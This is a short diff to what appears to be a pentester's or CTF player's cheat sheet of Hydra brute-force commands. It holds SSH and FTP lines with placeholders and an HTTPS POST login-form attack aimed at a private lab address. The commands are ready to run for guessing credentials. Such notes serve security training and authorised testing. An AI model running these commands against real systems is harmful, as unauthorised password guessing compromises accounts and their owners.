@@ -1,3 +1,10 @@
 SSH bruteforce
-hydra -l <username> -P <password_file> 10.10.100.236 ssh 
-hydra -L <username_file> -P <password_file> 10.10.100.236 ssh 
+hydra -l <username> -P <password_file> <ip> ssh 
+hydra -L <username_file> -P <password_file> <ip> ssh
+
+ftp bruteforce
+hydra -l <username> -P <password_file> <ip> ftp 
+hydra -L <username_file> -P <password_file> <ip> ftp 
+
+http-post
+hydra -L user -P pass 10.10.23.73 https-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect credentials"
